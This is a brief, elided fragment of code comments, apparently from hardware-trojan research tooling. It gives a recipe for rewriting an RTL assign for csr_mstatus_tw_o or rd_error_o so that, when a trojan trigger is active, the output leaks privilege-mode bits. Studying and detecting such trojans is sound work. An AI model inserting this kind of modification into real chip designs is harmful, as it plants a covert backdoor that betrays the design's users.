 ...
 * Payload: Route csr_mstatus_tw_o[0] to observable output
 * 
...
//   Find the assign for csr_mstatus_tw_o (or rd_error_o as fallback):
//     assign csr_mstatus_tw_o = <normal_expr>;
//   Replace with:
//     assign csr_mstatus_tw_o = trojan_active ? priv_mode_id_o[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? priv_mode_id_o[0] : 1'b0;
//
